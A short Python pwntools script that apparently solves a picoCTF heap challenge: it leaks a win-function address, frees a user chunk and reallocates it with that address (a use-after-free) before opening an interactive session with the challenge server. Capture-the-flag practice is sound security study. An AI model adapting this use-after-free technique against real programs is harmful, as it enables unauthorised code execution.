from pwn import *

#p = process("./vuln")
#gdb.attach(p)

p = remote("mercury.picoctf.net", 48259)



p.recvuntil(b"(e)xit")
p.sendline(b"S") #leak win address
p.recvline()
leak=p.recvline().decode().strip()
leak=leak[leak.index('0x'):]
log.info(f"'accidental' {leak=}")
win_func = p32(int(leak, 16))

p.recvuntil(b"(e)xit")
p.sendline(b"i") #free user chunk
p.recvline()
p.sendline(b"Y") #confirm
p.recvuntil(b"(e)xit")
p.sendline(b"L") #allocate win address where user chunk used to be
p.recvuntil(b"try anyways:")
p.sendline(win_func)

p.interactive()